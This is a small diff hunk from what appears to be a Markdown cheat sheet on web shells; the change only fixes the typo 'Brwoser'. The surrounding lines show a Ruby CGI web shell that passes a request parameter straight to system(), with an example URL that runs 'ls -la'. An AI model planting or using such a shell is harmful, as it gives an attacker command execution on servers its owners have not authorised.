@@ -233,7 +233,7 @@ system(cgi['cmd'])
 ```
 Now you can simply use browser, netcat or WebShellConsole[^1] to execute your commands.
 ex.
-**Brwoser**
+**Browser**
 ```
 http://host/cgi/shell.rb?cmd=ls -la
 ```
